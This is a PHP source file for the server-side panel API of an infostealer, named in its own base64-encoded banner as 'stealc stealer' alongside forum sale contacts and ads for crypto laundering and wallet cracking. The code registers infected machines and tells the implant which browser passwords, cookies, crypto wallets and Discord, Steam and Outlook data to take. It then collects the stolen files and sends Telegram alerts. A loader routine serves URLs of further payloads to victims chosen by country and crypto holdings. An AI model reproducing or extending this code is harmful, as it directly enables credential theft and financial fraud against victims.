<?php

class APIManager
{
    private $connection;
    private $gi;

    private $copyright_text;

    // ---------------------------------------------------------------------------------------
    // __construct
    //
    // class constructor
    // ---------------------------------------------------------------------------------------
    public function __construct($request)
    {
        // -----------------------------------------------------------------------------------
        // connect to db
        $this->ConnectDB();

        $this->copyright_text = base64_decode("CiBfX19fX18gICAgIF9fX19fXyAgIF9fX19fXyAgICAgX19fX19fICAgICBfXyAgICAgICAgIF9fX19fXwovXCAgX19fXCAgIC9cX18gIF9cIC9cICBfX19cICAgL1wgIF9fIFwgICAvXCBcICAgICAgIC9cICBfX19cClwgXF9fXyAgXCAgXC9fL1wgXC8gXCBcICBfX1wgICBcIFwgIF9fIFwgIFwgXCBcX19fXyAgXCBcIFxfX19fCiBcL1xfX19fX1wgICAgXCBcX1wgIFwgXF9fX19fXCAgXCBcX1wgXF9cICBcIFxfX19fX1wgIFwgXF9fX19fXAogIFwvX19fX18vICAgICBcL18vICAgXC9fX19fXy8gICBcL18vXC9fLyAgIFwvX19fX18vICAgXC9fX19fXy8KCiAgICAgICAgICAgICAgICAgICAgICAgc3RlYWxjIHN0ZWFsZXIKCnBvd2VyZnVsIG5hdGl2ZSBzdGVhbGVyIGJhc2VkIG9uIEMgbGFuZwoKZm9ydW0gdG9waWNzOgoJLSBodHRwczovL2ZvcnVtLmV4cGxvaXQuaW4vdG9waWMvMjIwMzQwLwoJLSBodHRwczovL3hzcy5pcy90aHJlYWRzLzc5NTkyLwoKYnV5OgoJLSBqYWJiZXI6IHBseW1vdXRoX3N1cHBvcnRAZXhwbG9pdC5pbQogICAgICAgIC0gdG94OiAxRkNDRUEwRDM3RDk5ODk0Qjk1OEMwRkNFQUM2NjAzNEZFMzU4MEIxOTNDMzM1NzQ1RDYzMkExOUY4RTYwNTNDMzRERkVBQUUyNTM4CgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tClN5bnRoZXRleCAtINCe0LHQvNC10L0g0LrRgNC40L/RgtGLIC8gMiUg0LrQvtC80LjRgdGB0LjRjyAvINCn0LjRgdGC0LrQsCwg0J3QsNC70LjRh9C90YvQtQoK0JTQtdC/0L7Qt9C40YIgMSBidGMg0L3QsCBleHBsb2l0LiDQn9C+0LzQvtCz0LDQtdC8INGBINGA0LDQt9Cx0LvQvtC60LjRgNC+0LLQutC+0Lkg0YHRgNC10LTRgdGC0LIg0LIg0L7QsdC80LXQvdC90LjQutCw0YUg0Lgg0LHQuNGA0LbQsNGFLiDQn9GA0L7QudC00LXQvCBLWUMg0L3QsCDQu9GO0LHQvtC8INGB0LXRgNCy0LjRgdC1LiAK0J7Qv9C70LDRgtC40Lwg0LvRjtCx0YvQtSDRgtC+0LLQsNGA0Ysg0Lgg0YPRgdC70YPQs9C4INC40L3QvtGB0YLRgNCw0L3QvdGL0LzQuCDQutCw0YDRgtCw0LzQuCDQuNC70Lgg0LHQsNC90LrQvtCy0YHQutC40LzQuCDQv9C10YDQtdCy0L7QtNCw0LzQuCAkLOKCrCzguL8uCgrQmtC+0L3RgtCw0LrRgjogaHR0cHM6Ly90Lm1lL3N5bnRoZXRleF9taXgKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KTUFJRkUgLSBCcnV0ZS1mb3JjZSAocGFzc3dvcmQgY3JhY2tpbmcpIGZvciBjcnlwdG8gd2FsbGV0cyAoTWV0YW1hc2ssIEV4b2R1cywgLmRhdCBmaWxlcywgYW5kIG90aGVycykKCuKAoiBXZSBoYXZlIGJlZW4gd2l0aGRyYXdpbmcgY3J5cHRvY3VycmVuY3kgZnJvbSBsb2dzIGZvciBvdmVyIDQgeWVhcnMsIHdpdGggYSB0b3RhbCBhbW91bnQgd2l0aGRyYXduIGV4Y2VlZGluZyAkMTUuMDAwLjAwMArigKIgT3VyIHRvdGFsIGRlcG9zaXQgb24gZm9ydW1zIGV4Y2VlZHMgNSBCVEMgKG92ZXIgJDMwMC4wMDApLCB3aGljaCBjb25maXJtcyBvdXIgcmVsaWFiaWxpdHksIHdoaWxlIGZlZWRiYWNrIGZyb20gc2F0aXNmaWVkIGNsaWVudHMgY29uZmlybXMgc3VjY2Vzc2Z1bCBjYXNlcy4K4oCiIEluIGFkZGl0aW9uIHRvIG1hbnVhbCB3b3JrLCB3ZSB1c2UgYSBwb3dlcmZ1bCBNTCBtb2RlbCB3ZSBjcmVhdGVkIGFuZCB0cmFpbmVkIGFzIGFuIGF1eGlsaWFyeSB0b29sLiBJdCBoYXMgYmVlbiB0cmFpbmVkIG9uIG92ZXIgMS4wMDAuMDAwIGxvZ3MsIGFsbG93aW5nIHVzIHRvIHNwZWVkIHVwIHRoZSBwcm9jZXNzIGFuZCBpbXByb3ZlIHRoZSBhY2N1cmFjeSBvZiBwYXNzd29yZCBjcmFja2luZy4KCkNvbW1pc3Npb24gc3BsaXQ6IDcwLzMwIGluIHlvdXIgZmF2b3IKV2FsbGV0cyBhY2NlcHRlZCB3aXRoIGEgYmFsYW5jZSBvZiBhdCBsZWFzdCAkMTAuMDAwCgpUZWxlZ3JhbTogQG0yZmFfYnJ1dGUKQ2hhbm5lbCB3aXRoIGNvbnRhY3RzOiBAbWFpZmUyZmEKaHR0cHM6Ly9mb3J1bS5leHBsb2l0LmluL3RvcGljLzIxOTAyOCB8ICgzIEJUQyBERVApCmh0dHBzOi8veHNzLmlzL3RocmVhZHMvODAyNDgvIHwgKDIgQlRDIERFUCkKaHR0cHM6Ly96ZWxlbmthLmd1cnUvdGhyZWFkcy80OTI2Mzg0LyB8ICgyLjAwMCQgREVQKQoKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ==");
        
        // -----------------------------------------------------------------------------------
        // geoip
        $this->gi = geoip_open("app/geoip/geoip.dat", GEOIP_STANDARD);

        // -----------------------------------------------------------------------------------
        // check request types
        switch($request["type"])
        {
            // -------------------------------------------------------------------------------
            // create token and getting bot configuration
            case "create":
                $this->Create($request);
                break;

            // -------------------------------------------------------------------------------
            // uploading file
            case "upload_file":
                $this->UploadFile($request);
                break;

            // -------------------------------------------------------------------------------
            // done message
            case "done":
                $this->Done($request);
                break;

            case "loader":
                $this->Loader($request);
                break;

            // -------------------------------------------------------------------------------
            // unknown packet
            default:
                $response = [
                    "opcode" => "unknown"
                ];
                echo APIManager::EncryptMessage($response);
                break;
        }
    }

    // ---------------------------------------------------------------------------------------
    // __destruct
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function __destruct()
    {
        mysqli_close($this->connection);
    }

    // ---------------------------------------------------------------------------------------
    // ConnectDB
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function ConnectDB()
    {
        $this->connection = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);

        if ($this->connection->connect_error)
        {
            $response = [
                "packet" => "error"
            ];

            die(APIManager::EncryptMessage($response));
        }
    }

    // ---------------------------------------------------------------------------------------
    // Create
    //
    // Create log and go working
    // ---------------------------------------------------------------------------------------
    public function Create($request)
    {
        $ip         = APIManager::getClientIP();
        $iso        = geoip_country_code_by_addr($this->gi, $ip)  == "" ? "UN" : geoip_country_code_by_addr($this->gi, $ip);

        $date       = date("Y-m-d H:i:s");
        $date_file  = date("Y_m_d_H_i_s");

        // -----------------------------------------------------------------------------------
        // check request params
        if (!empty($request['hwid']) && !empty($request['build']))
        {
            // -------------------------------------------------------------------------------
            // check bot isset
            $logsManager = new LogsManager($this->connection);
            $buildsManager = new BuildsManager($this->connection);

            // -------------------------------------------------------------------------------
            // TODO: check ip or hwid is banned
            if($this->isBlocked($ip, $request['hwid']))
            {
                $response = [
                    "opcode" => "blocked"
                ];

                die(apiManager::EncryptMessage($response));
            }


            // -------------------------------------------------------------------------------
            // check build id isset
            $build = $buildsManager->CheckBuild($request["build"]);

            // -------------------------------------------------------------------------------
            // build not found
            if(!$build)
            {
                $response = [
                    "opcode" => "error"
                ];

                die(apiManager::EncryptMessage($response));
            }
            else
            {
                // ---------------------------------------------------------------------------
                // check log repeated
                $repeated = $logsManager->CheckRepeated($request["hwid"]);

                // ---------------------------------------------------------------------------
                // check block hwid duplicates
                if($build->block_hwid)
                {
                    if($repeated)
                    {
                        $response = [
                            "opcode" => "blocked"
                        ];
        
                        die(apiManager::EncryptMessage($response));
                    }
                }

                // ---------------------------------------------------------------------------
                // check block ip today
                if($build->block_ips)
                {
                    if($this->CheckIpLockToday($ip))
                    {
                        $response = [
                            "opcode" => "blocked"
                        ];
        
                        die(apiManager::EncryptMessage($response));
                    }
                }

                // ---------------------------------------------------------------------------
                // generate zip name
                $zip_name = sprintf("%s_%s_%s.zip", $iso, $ip, $date_file);

                // ---------------------------------------------------------------------------
                // create log in table
                $access_token = $logsManager->CreateLog($build->name, $ip, $iso, $request["hwid"], $zip_name, $repeated);

                // ---------------------------------------------------------------------------
                // create cron
                $this->CreateCron($access_token);

                // ---------------------------------------------------------------------------
                // TODO: update logs count in builds
                $buildsManager->UpdateLogsCount($build->name);

                // ---------------------------------------------------------------------------
                // create zip
                $zipManager = new ZipManager();

                if($zipManager->CreateZip($zip_name))
                {
                    // -----------------------------------------------------------------------
                    // add start files
                    $zipManager->AddFile("copyright.txt", $this->copyright_text, false);
                    $zipManager->AddComment($this->copyright_text);

                    // -----------------------------------------------------------------------
                    // generate bot config
                    $browsers               = $buildsManager->getBrowsers();
                    $plugins                = $buildsManager->getPlugins();
                    $wallets                = $buildsManager->getWallets();
                    $programs               = $buildsManager->getPrograms();
                    $grabber                = $buildsManager->getGrabberRules();

                    // -----------------------------------------------------------------------
                    // general configuration
                    $response = [
                        "opcode"            => "success",
                        "access_token"      => $access_token,
                        "self_delete"       => $build->self_delete,
                        "take_screenshot"   => $build->take_screenshot,
                        "loader"            => $build->loader_before_grabber,
                        "steal_steam"       => $build->steal_steam,
                        "steal_outlook"     => $build->steal_outlook,
                    ];

                    // -----------------------------------------------------------------------
                    // browsers list
                    if (is_array($browsers) && !empty($browsers))
                    {
                        $response["browsers"] = array_map(function($browser) 
                        {
                            return [
                                'name'              => $browser->name,
                                'path'              => $browser->path,
                                'type'              => $browser->type,
                                'soft_path'         => $browser->soft_path,
                                'use_v20'           => $browser->use_v20,
                                'parse_cookies'     => $browser->parse_cookies,
                                'parse_logins'      => $browser->parse_logins,
                                'parse_history'     => $browser->parse_history,
                                'parse_webdata'     => $browser->parse_webdata
                            ];
                        }, $browsers);
                    }

                    // -----------------------------------------------------------------------
                    // plugins list
                    if (is_array($plugins) && !empty($plugins))
                    {
                        $response["plugins"] = array_map(function($plugin) 
                        {
                            return [
                                'name'              => $plugin->name,
                                'token'             => $plugin->token,
                                'from_local'        => $plugin->from_local,
                                'from_sync'         => $plugin->from_sync,
                                'from_IndexedDB'    => $plugin->from_IndexedDB
                            ];
                        }, $plugins);
                    }

                    // -----------------------------------------------------------------------
                    // firefox plugins list


                    // -----------------------------------------------------------------------
                    // grabber configuration
                    $files = array_merge($wallets, $programs, $grabber);

                    if (is_array($files) && !empty($files))
                    {
                        $response["files"] = array_map(function($file) 
                        {
                            return [
                                'name'              => $file->name,
                                'type'              => (int) $file->type,
                                'csidl'             => (int) $file->csidl,
                                'start_path'        => $file->start_path,
                                'masks'             => $file->masks,
                                'recursive'         => $file->recursive,
                                'max_size'          => (int) $file->max_size,
                                'iterations'        => (int) $file->iterations
                            ];
                        }, $files);
                    }

                    // -----------------------------------------------------------------------
                    // send response
                    die(APIManager::EncryptMessage($response));
                }
                else
                {
                    $response = [
                        "opcode" => "error"
                    ];
                    die(apiManager::EncryptMessage($response));
                }
            }
        }
        else
        {
            $response = [
                "opcode" => "error"
            ];
            die(apiManager::EncryptMessage($response));
        }
    }

    // ---------------------------------------------------------------------------------------
    // UploadFile
    //
    // Upload file to log
    // ---------------------------------------------------------------------------------------
    public function UploadFile($request)
    {
        $ip         = APIManager::getClientIP();
        $iso        = geoip_country_code_by_addr($this->gi, $ip)  == "" ? "UN" : geoip_country_code_by_addr($this->gi, $ip);

        if (!empty($request['access_token']))
        {
            if(isset($request["filename"]) & isset($request["data"]))
            {
                // ---------------------------------------------------------------------------
                // decode file to binary data
                $file           = base64_decode($request["data"]);
                $access_token   = $request["access_token"];
                $filename       = base64_decode($request["filename"]);

                // ---------------------------------------------------------------------------
                // init log manager
                $logsManager = new LogsManager($this->connection);

                // ---------------------------------------------------------------------------
                // get log by token
                $log = $logsManager->getLogByToken($access_token);

                // ---------------------------------------------------------------------------
                // init markers manager
                $markersManager = new MarkersManager($this->connection);

                if(!$log)
                {
                    $response = [
                        "opcode" => "error1"
                    ];

                    die(apiManager::EncryptMessage($response));
                }

                // change log status
                $log->log_status = 1;

                // ---------------------------------------------------------------------------
                // generate log info
                $zip_path = LOGS_PATH."/". basename($log->filename);

                // ---------------------------------------------------------------------------
                // check file exist
                if(file_exists($zip_path))
                {
                    $parse_filename = explode("\\", $filename);

                    // -----------------------------------------------------------------------
                    // create zip
                    $zipManager = new ZipManager();
                    $zipManager->OpenZip($log->filename);

                    if($zipManager->OpenZip($log->filename))
                    {
                        // -------------------------------------------------------------------
                        // adding to zip?
                        $add_to_archive = true;
                        $rewriting = false;

                        // -------------------------------------------------------------------
                        // change log size
                        $log->UpdateSize(strlen($file));

                        switch($parse_filename[0])
                        {
                            case "system_info.txt":
						        $system_info  	                = explode("\n", $file);
                                $this->ReadProcessList($log, $system_info);

                                $system 		                = substr($system_info[6], 7);
                                $architecture 	                = substr($system_info[7], 17);

                                $os                             = APIManager::getWindowsVersion($system);
                                
                                $pc_username	                = substr($system_info[8], 13);
                                $pc_name		                = substr($system_info[9], 18);

                                $file                           = str_ireplace("IP?", $ip, $file);
                                $file                           = str_ireplace("ISO?", $iso, $file);

                                // save pc names
                                $log->log_info["pc_username"]   = $pc_username;
                                $log->log_info["pc_name"]       = $pc_name;

                                $log->system                    = $os;
                                $log->architecture              = $architecture;
                                $log->information               = $file;
                                break;

                            case "keys":
                                $add_to_archive = false;
                                $log->decrypt_keys[$parse_filename[1]][str_replace(".txt", "", $parse_filename[2])] = $file;
                                break;

                            case "passwords.txt":
                                $log->UpdatePasswordsCount(substr_count($file, "browser:"));

                                $passwords_file = explode("\n", $file);

                                foreach($passwords_file as &$password)
                                {
                                    if(substr($password, 0, 9) == "browser: ")
                                    {
                                        $browser_name = substr($password, 9);
                                        $log->log_info["browsers"][$browser_name]++;
                                    }
                                }

                                $log->array_passwords .= $file;
                                $markersManager->Scan($log, $file);
                                break;

                            case "wallets":
                                $log->log_info["wallets"][$parse_filename[1]]++;
                                $log->count_wallets++;
                                break;

                            case "plugins":
                                $log->log_info["plugins"][$parse_filename[1]]["count"]++;
                                $log->log_info["plugins"][$parse_filename[1]][$parse_filename[2]][$parse_filename[3]]["files"][$parse_filename[4]][] = $parse_filename[5];
                                $log->count_wallets++;

                                $rewriting = true;
                                break;

                            case "browsers":
                                $add_to_archive = false;
                                new BrowsersManager($markersManager, $log, $filename, $file, $this->connection, $zipManager);
                                break;

                            case "screenshot.jpg":
                                $log->screenshot = true;
                                break;

                            case "soft":
                                switch($parse_filename[1])
                                {
                                    case "Discord":
                                        $add_to_archive = false;
                                        $discord_tokens = ProgramsManager::ReadDiscord($log, $file);

                                        if(strlen($discord_tokens) > 5)
                                        {
                                            $zipManager->AddFile("soft\\Discord\\tokens.txt", $discord_tokens, false);
                                        }
                                        break;

                                    default:
                                        $log->log_info["soft"][$parse_filename[1]]++;
                                        break;
                                }
                                break;
                        }

                        // -------------------------------------------------------------------
                        // creating file in zip?
                        if($add_to_archive)
                        {
                            $zipManager->AddFile($filename, $file, $rewriting);
                        }

                        // -------------------------------------------------------------------
                        // update log in db
                        $logsManager->UpdateLog($log, true);

                        // -------------------------------------------------------------------
                        // gen response
                        $response = [
                            "opcode" => "success"
                        ];
                
                        die(APIManager::EncryptMessage($response));
                    }
                    else
                    {
                        $response = [
                            "opcode" => "error2"
                        ];
                
                        die(APIManager::EncryptMessage($response));
                    }
                }
                else
                {
                    $response = [
                        "opcode" => "error3"
                    ];
            
                    die(APIManager::EncryptMessage($response));
                }
            }
            else
            {
                $response = [
                    "opcode" => "error4"
                ];
        
                die(APIManager::EncryptMessage($response));
            }
        }
        else
        {
            $response = [
                "opcode" => "error5"
            ];
    
            die(APIManager::EncryptMessage($response));
        }
    }

    // ---------------------------------------------------------------------------------------
    // Done
    //
    // Done message for change log status to uploaded
    // ---------------------------------------------------------------------------------------
    public function Done($request)
    {
        if (!empty($request['access_token']))
        {
            // -------------------------------------------------------------------------------
            // access token
            $access_token = $request["access_token"];

            // -------------------------------------------------------------------------------
            // init log manager
            $logsManager = new LogsManager($this->connection);

            // -------------------------------------------------------------------------------
            // get log by token
            $log = $logsManager->getLogByToken($access_token);

            if(!$log)
            {
                $response = [
                    "opcode" => "error1"
                ];

                die(apiManager::EncryptMessage($response));
            }

            // change log status
            $log->log_status = 2;

            // -------------------------------------------------------------------------------
            // update log in db
            $logsManager->UpdateLog($log, false);

            // -------------------------------------------------------------------------------
            // send notification
            $telegramManager = new TelegramManager($this->connection);
            $telegramManager->SendNotify($log, true);

            // -------------------------------------------------------------------------------
            // gen response
            $response = [
                "opcode" => "success"
            ];
            
            die(APIManager::EncryptMessage($response));
        }
        else
        {
            $response = [
                "opcode" => "error5"
            ];
    
            die(APIManager::EncryptMessage($response));
        }
    }

    // ---------------------------------------------------------------------------------------
    // Loader
    //
    // Getting loader rules
    // ---------------------------------------------------------------------------------------
    public function Loader($request)
    {
        if (!empty($request['access_token']))
        {
            // -------------------------------------------------------------------------------
            // access token
            $access_token = $request["access_token"];

            // -------------------------------------------------------------------------------
            // init log manager
            $logsManager = new LogsManager($this->connection);

            // -------------------------------------------------------------------------------
            // get log by token
            $log = $logsManager->getLogByToken($access_token);

            if(!$log)
            {
                $response = [
                    "opcode" => "error1"
                ];

                die(apiManager::EncryptMessage($response));
            }

            // -------------------------------------------------------------------------------
            // getting rules
            $loader_rules = $this->getLoaderRules($log);

            // -------------------------------------------------------------------------------
            // gen response
            $response = [
                "opcode" => "success",
                "loader" => $loader_rules
            ];
            
            die(APIManager::EncryptMessage($response));
        }
        else
        {
            $response = [
                "opcode" => "error5"
            ];
    
            die(APIManager::EncryptMessage($response));
        }
    }

    // ---------------------------------------------------------------------------------------
    // EncryptMessage
    //
    // 
    // ---------------------------------------------------------------------------------------
    public static function EncryptMessage($message)
    {
        $message = array_merge([APIManager::generateRandomString(random_int(10, 15)) => APIManager::generateRandomString(random_int(10, 15))], $message);

        /*return base64_encode(
            APIManager::rc4(RC4_KEY, json_encode($message))
        );*/

        return base64_encode(
            json_encode($message)
        );
    }

    // ---------------------------------------------------------------------------------------
    // rc4
    //
    // 
    // ---------------------------------------------------------------------------------------
    public static function rc4($key, $data)
    {
        $key = array_values(unpack('C*', $key));
        $keyLength = count($key);
        
        $S = range(0, 255);
        $j = 0;
    
        for ($i = 0; $i < 256; $i++) 
        {
            $j = ($j + $S[$i] + $key[$i % $keyLength]) % 256;
            list($S[$i], $S[$j]) = array($S[$j], $S[$i]);
        }
    
        $i = $j = 0;
    
        $result = '';
        $chunkSize = 4096;
    
        $dataLength = strlen($data);
    
        for ($offset = 0; $offset < $dataLength; $offset += $chunkSize)
        {
            $chunk = substr($data, $offset, $chunkSize);
            $chunk = array_values(unpack('C*', $chunk));
            $chunkLength = count($chunk);
    
            for ($y = 0; $y < $chunkLength; $y++) 
            {
                $i = ($i + 1) % 256;
                $j = ($j + $S[$i]) % 256;
                list($S[$i], $S[$j]) = array($S[$j], $S[$i]);
                $result .= chr($chunk[$y] ^ $S[($S[$i] + $S[$j]) % 256]);
            }
        }
    
        return $result;
    }

    // ---------------------------------------------------------------------------------------
    // generateRandomString
    //
    // 
    // ---------------------------------------------------------------------------------------
    public static function generateRandomString($length = 10) 
    {
        $randomBytes = random_bytes(ceil($length / 2));
        $randomString = bin2hex($randomBytes);

        return substr($randomString, 0, $length);
    }

    // ---------------------------------------------------------------------------------------
    // getClientIP
    //
    // 
    // ---------------------------------------------------------------------------------------
    public static function getClientIP()
    {
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER))
        {
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }
        else if (array_key_exists('HTTP_X_REAL_IP', $_SERVER))
        {
            return $_SERVER["HTTP_X_REAL_IP"];
        }
        else if (array_key_exists('REMOTE_ADDR', $_SERVER))
        {
            return $_SERVER["REMOTE_ADDR"];
        }
        else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER))
        {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        
    }

    // ---------------------------------------------------------------------------------------
    // getWindowsVersion
    //
    // 
    // ---------------------------------------------------------------------------------------
    public static function getWindowsVersion($versionString) 
    {
        $parts = explode(' ', $versionString);

        $versionNumber = $parts[0];
        $buildNumber = (int)str_replace(['(', 'Build', ')'], '', $parts[2]);
    
        $windowsVersions = [
            '10.0' => [
                'builds' => [
                    22000 => 'Windows 11',
                    10240 => 'Windows 10',
                ],
                'default' => 'Windows 10'
            ],
            '6.3' => 'Windows 8.1',
            '6.2' => 'Windows 8',
            '6.1' => 'Windows 7',
            '6.0' => 'Windows Vista',
            '5.2' => 'Windows Server 2003',
            '5.1' => 'Windows XP',
        ];
    
        if (array_key_exists($versionNumber, $windowsVersions)) 
        {
            $versionInfo = $windowsVersions[$versionNumber];
    
            if (is_array($versionInfo)) 
            {
                foreach ($versionInfo['builds'] as $buildThreshold => $name) 
                {
                    if ($buildNumber >= $buildThreshold) 
                    {
                        return $name;
                    }
                }
                return $versionInfo['default'];
            } 
            else 
            {
                return $versionInfo;
            }
        }
    
        return 'Unknown';
    }

    // ---------------------------------------------------------------------------------------
    // CreateCron
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function CreateCron($access_token)
    {
        $executionTime = 'now + 2 minute';// 5 min
        $atCommand = "echo \"/usr/bin/php /var/www/html/worker.php $access_token\" | at $executionTime";
        
        exec($atCommand, $output, $returnVar);
    }

    // ---------------------------------------------------------------------------------------
    // isBlocked
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function isBlocked($clientIp, $clientHwid) 
    {
        $query = "SELECT type, value FROM blocklist";
        
        if ($result = $this->connection->query($query)) 
        {
            while ($row = $result->fetch_assoc()) 
            {
                if ($row['type'] === 'ip' && $clientIp === $row['value']) 
                {
                    return true;
                }
                
                if ($row['type'] === 'mask') 
                {
                    $mask = str_replace('*', '', $row['value']);
                    
                    if (strpos($clientIp, $mask) === 0) 
                    {
                        return true;
                    }
                }
                
                if ($row['type'] === 'hwid' && $clientHwid === $row['value']) 
                {
                    return true;
                }
            }
            
            $result->free();
        }
        return false;
    }

    // ---------------------------------------------------------------------------------------
    // getLoaderRules
    //
    // get loader from db
    // ---------------------------------------------------------------------------------------
    public function getLoaderRules($log)
    {
        $query = "SELECT * FROM loader WHERE active = 1";
        $result = $this->connection->query($query);

        if(!$result)
        {
            return;
        }

        // get installed apps and proc list
        $system = $this->ReadProcessList($log);

        $markers = [];
        $rules = [];

        if (isset($log->log_info['marker']) && is_array($log->log_info['marker']))
        {
            foreach ($log->log_info['marker'] as $markerType => $items)
            {
                if (is_array($items))
                {
                    foreach ($items as $domain => $info)
                    {
                        $markers[] = $domain;
                    }
                }
            }
        }

        while ($rule = $result->fetch_assoc()) 
        {
            $show = true;

            if($rule['crypto'] == 1)
            {
                if($log->count_wallets == 0)
                {
                    $show = false;
                }
            }

            if (!empty($rule['geo'])) 
            {
                $geo_list = array_map('trim', explode(',', $rule['geo']));
                
                if (!in_array($log->iso, $geo_list)) 
                {
                    $show = false;
                }
            }

            if (!empty($rule['builds'])) 
            {
                $builds_list = array_map('trim', explode(',', $rule['builds']));

                if (!in_array($log->build, $builds_list)) 
                {
                    $show = false;
                }
            }

            if (!empty($rule['markers']))
            {
                $rule_markers = array_map('trim', explode(',', $rule['markers']));
                $log_markers = array_map('trim', $markers);

                if (empty(array_intersect($rule_markers, $log_markers))) 
                {
                    $show = false;
                }
            }

            if (!empty($rule['programs']))
            {
                $show = false;

                $rule_programs = array_map('trim', explode(',', $rule['programs']));

                foreach ($rule_programs as $_program) 
                {
                    foreach ($system['apps'] as $program)
                    {
                        if (stripos($program, $_program) !== false)
                        {
                            $show = true;
                            break 2;
                        }
                    }
                }
            }

            if (!empty($rule['process']))
            {
                $rule_process = array_map('trim', explode(',', $rule['process']));

                if (empty(array_intersect($rule_process, $system["process_list"]))) 
                {
                    $show = false;
                }
            }

            if ($show) 
            {
                if ($rule['load_limit'] > 0) 
                {
                    if ($rule['count'] < $rule['load_limit'])
                    {
                        $updateQuery = "UPDATE loader SET count = count + 1 WHERE loader_id  = ". $rule['loader_id'];
                        $this->connection->query($updateQuery);

                        if ((++$rule['count']) == $rule['load_limit'])
                        {
                            $updateQuery = "UPDATE loader SET active = 0 WHERE loader_id = ". $rule['loader_id'];
                            $this->connection->query($updateQuery);
                        }

                        $rules[] = [
                            'url'           => $rule["url"],
                            'csidl'         => $rule["csidl"],
                            'run_as_admin'  => $rule["run_as_admin"],
                            'type'          => $rule["type"]
                        ];
                    }
                    else
                    {
                        $updateQuery = "UPDATE loader SET active = 0 WHERE loader_id = ". $rule['loader_id'];
                        $this->connection->query($updateQuery);
                    }
                }
                else
                {
                    $updateQuery = "UPDATE loader SET count = count + 1 WHERE loader_id  = ". $rule['loader_id'];
                    $this->connection->query($updateQuery);

                    $rules[] = [
                        'url'           => $rule["url"],
                        'csidl'         => $rule["csidl"],
                        'run_as_admin'  => $rule["run_as_admin"],
                        'type'          => $rule["type"]
                    ];
                }
            }
        }

        return $rules;
    }

    // ---------------------------------------------------------------------------------------
    // ReadProcessList
    //
    // read process list for loader
    // ---------------------------------------------------------------------------------------
    public function ReadProcessList($log)
    {
        $system_info = explode("\n", $log->information);

        $process_list = [];
        $apps = [];

        $parsingProcesses = false;
        $parsingApps = false;

        foreach ($system_info as $line)
        {
            if (!$parsingProcesses && !$parsingApps) 
            {
                if (strpos($line, 'Process List:') !== false) 
                {
                    $parsingProcesses = true;
                }
                continue;
            }

            if ($parsingProcesses)
            {
                if (strpos($line, 'Installed Apps:') !== false)
                {
                    $parsingProcesses = false;
                    $parsingApps = true;
                    continue;
                }

                if (substr($line, 0, 2) === "\t\t") 
                {
                    $line = substr($line, 2);
                }

                if (preg_match('/^(.*?)\s+\[\d+\]/', $line, $matches)) 
                {
                    $process = trim($matches[1]);
                    
                    if (!in_array($process, $process_list)) 
                    {
                        $process_list[] = $process;
                    }
                }
    
                continue;
            }

            if ($parsingApps)
            {
                if (strpos($line, 'All Users:') !== false || strpos($line, 'Current User:') !== false) 
                {
                    continue;
                }

                if (trim($line) === '') 
                {
                    continue;
                }

                $line = ltrim($line);

                $parts = explode(' - ', $line, 2);
                $appName = trim($parts[0]);

                if (!in_array($appName, $apps))
                {
                    $apps[] = $appName;
                }
            }
        }

        return [
            "process_list"      => $process_list,
            "apps"              => $apps,
        ];
    }

    // ---------------------------------------------------------------------------------------
    // CheckIpLockToday
    //
    // check ip block today for cur ip
    // ---------------------------------------------------------------------------------------
    public function CheckIpLockToday($ip)
    {
        $query = "SELECT COUNT(*) AS cnt FROM logs WHERE ip = ? AND DATE(date) = CURDATE()";
        $stmt = $this->connection->prepare($query);
        $stmt->bind_param("s", $ip);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($row['cnt'] > 0)
        {
            return true;
        }
        else
        {
            return false;
        }
    }
}

?>